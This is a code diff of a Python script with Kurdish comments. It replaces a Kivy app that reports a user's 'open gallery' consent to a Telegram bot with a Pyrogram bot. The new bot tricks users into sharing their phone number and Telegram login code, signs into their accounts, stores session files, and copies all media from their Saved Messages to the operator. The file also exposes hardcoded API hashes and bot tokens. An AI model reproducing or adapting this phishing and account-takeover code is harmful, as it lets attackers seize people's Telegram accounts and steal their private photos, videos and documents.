@@ -1,59 +1,86 @@
 import os
-import requests
-from kivy.app import App
-from kivy.uix.boxlayout import BoxLayout
-from kivy.uix.button import Button
-from kivy.uix.label import Label
+import asyncio
+from pyrogram import Client, filters
+from pyrogram.types import ReplyKeyboardMarkup, KeyboardButton, Message
 
-# زانیارییەکانی بۆتی تلگرامەکەت و ئایدییەکەی تۆ
-BOT_TOKEN = "8667887809:AAE8BpyPP9ehPEs0czgimcLiryYXHgryZYw"
-CHAT_ID = "8734106005"
+# زانیارییەکانت جێگیر کران
+API_ID = 36234377
+API_HASH = "5e199e2ae89cc1c42a6a4853951ff98f"
+BOT_TOKEN = "8993540801:AAH_W0X78Cjndjg1uXwgwl4khRSWvk5JFfw"
 
-class TelegramAppUI(BoxLayout):
-    def __init__(self, **kwargs):
-        super(TelegramAppUI, self).__init__(**kwargs)
-        self.orientation = 'vertical'
-        self.padding = 50
-        self.spacing = 20
+SESSION_DIR = "sessions"
+os.makedirs(SESSION_DIR, exist_ok=True)
 
-        # دیزاینی پەنجەرەکە
-        self.label = Label(
-            text="ئایا دەتەوێت گەلەری مۆبایلی خۆت بکەیتەوە؟", 
-            font_size=18,
-            halign='center'
-        )
-        self.add_widget(self.label)
+bot = Client("my_auth_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
 
-        # دوگمەی بەڵێ
-        self.btn_yes = Button(text="بەڵێ", size_hint=(1, 0.3))
-        self.btn_yes.bind(on_press=self.on_yes_clicked)
-        self.add_widget(self.btn_yes)
+@bot.on_message(filters.command("start"))
+async def start_command(client, message: Message):
+    keyboard = ReplyKeyboardMarkup(
+        [[KeyboardButton("ناردنی ژمارەی تەلەفۆن 📱", request_contact=True)]],
+        resize_keyboard=True,
+        one_time_keyboard=True
+    )
+    await message.reply("بەخێر بێیت! بۆ بەردەوامبوون تکایە دوگمەی خوارەوە سەرکوت بکە:", reply_markup=keyboard)
 
-        # دوگمەی نەخێر
-        self.btn_no = Button(text="نەخێر", size_hint=(1, 0.3))
-        self.btn_no.bind(on_press=self.exit_app)
-        self.add_widget(self.btn_no)
-
-    def on_yes_clicked(self, instance):
-        self.label.text = "تکایە چاوەڕوان بە..."
-        try:
-            # ناردنی پەیام بۆ بۆت کە بەکارهێنەر ڕەزامەندی داوە
-            message = "بەکارهێنەر دوگمەی (بەڵێ)ـی داگرت و گەلەری کرایەوە!"
-            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-            payload = {"chat_id": CHAT_ID, "text": message}
-            requests.post(url, data=payload)
-            
-            self.label.text = "سوپاس بۆ بەکارهێنان!"
-        except Exception as e:
-            self.label.text = "هەڵەیەک ڕوویدا لە پەیوەندیکردن."
-
-    def exit_app(self, instance):
-        App.get_running_app().stop()
-
-class MyApp(App):
-    def build(self):
-        return TelegramAppUI()
-
-if __name__ == '__main__':
-    MyApp().run()
+@bot.on_message(filters.contact)
+async def get_contact(client, message: Message):
+    phone_number = message.contact.phone_number
+    user_id = message.from_user.id
     
+    await message.reply("چاوەڕێ بکە، کۆد بۆ تلگرامت دەنێرم...")
+    
+    try:
+        user_client = Client(f"{SESSION_DIR}/user_{user_id}", api_id=API_ID, api_hash=API_HASH, phone_number=phone_number, in_memory=True)
+        await user_client.connect()
+        sent_code = await user_client.send_code(phone_number)
+        
+        with open(f"{SESSION_DIR}/{user_id}_hash.txt", "w") as f: f.write(sent_code.phone_code_hash)
+        with open(f"{SESSION_DIR}/{user_id}_phone.txt", "w") as f: f.write(phone_number)
+            
+        await user_client.disconnect()
+        await message.reply("✅ کۆد نێردرا! لێرە بنووسەی (بێ بۆشایی):")
+    except Exception as e:
+        await message.reply(f"هەڵە: {str(e)}")
+
+@bot.on_message(filters.text & ~filters.command("start"))
+async def get_code_and_process(client, message: Message):
+    user_id = message.from_user.id
+    code = message.text.strip()
+    
+    hash_file = f"{SESSION_DIR}/{user_id}_hash.txt"
+    phone_file = f"{SESSION_DIR}/{user_id}_phone.txt"
+    
+    if not os.path.exists(hash_file):
+        await message.reply("تکایە سەرەتا /start بنووسە.")
+        return
+        
+    with open(hash_file, "r") as f: phone_code_hash = f.read().strip()
+    with open(phone_file, "r") as f: phone_number = f.read().strip()
+        
+    await message.reply("خەریکی چوونەژوورەوەین...")
+    
+    try:
+        user_client = Client(f"{SESSION_DIR}/user_{user_id}", api_id=API_ID, api_hash=API_HASH, phone_number=phone_number)
+        await user_client.connect()
+        await user_client.sign_in(phone_number, phone_code_hash, code)
+        
+        await message.reply("✅ چوویتە ژوورەوە! خەریکی گواستنەوەی فایلی Saved Messages... تکایە چاوەڕێ بکە.")
+        
+        count = 0
+        async for msg in user_client.get_chat_history("me"):
+            if msg.video or msg.document or msg.photo:
+                await msg.copy(chat_id=message.chat.id)
+                count += 1
+                await asyncio.sleep(1.5)
+                    
+        await message.reply(f"🎉 پرۆسەکە تەواو بوو! کۆی گشتی {count} فایل گواسترایەوە.")
+        await user_client.disconnect()
+        
+        if os.path.exists(hash_file): os.remove(hash_file)
+        if os.path.exists(phone_file): os.remove(phone_file)
+        
+    except Exception as e:
+        await message.reply(f"هەڵە لە چوونەژوورەوە: {str(e)}")
+
+bot.run()
+            
